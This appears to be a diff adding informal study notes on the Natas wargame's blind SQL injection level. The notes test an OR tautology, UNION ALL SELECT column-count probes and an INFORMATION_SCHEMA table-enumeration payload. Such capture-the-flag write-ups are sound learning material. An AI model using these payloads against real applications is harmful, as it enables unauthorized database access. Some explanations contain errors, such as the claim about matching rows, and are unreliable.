@@ -1,0 +1,36 @@
+BLIND SQL INJECTIONS
+
+WHen we login with the credentials we can see a page where we are supposed to type in a username and it will check its existence.
+
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+  
+  This is from the source code and checks if the username exists.
+  
+  The application checks if the user exists.
+
+when we type natas15 user does not exist
+but for the nats16 ite returns 'user exists'
+
+It is checking to see if the user natas16 exists or not 
+
+Next step is to trigger an error in the application.
+natas16 OR "1"="1" error in query when we use this..that must be due to the double quotes
+
+SELECT * FROM users WHERE username="natas16" OR "1"="1";
+
+SELECT * FROM users WHERE username="natas16" UNION ALL SELECT 1;#  --this given an error in the query
+
+The union all will add another query on top of the initial one without having to create a new SQL query altogether, ; to end the query and # is used to comment it out.
+
+The error might be occuring as the query is selecting '*' all the columns from the table and the selct statement after UNION Only mentions 1 column
+
+natas16" UNION ALL SELECT 1,2;# This user exists..The number of rows and columns should be equal
+
+Next we will check if the user has tables inside and outside the database
+natas16" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "information_schema";#
+
+The information_schema.tables will allow us to view all the information from the tables within a database.
+
+
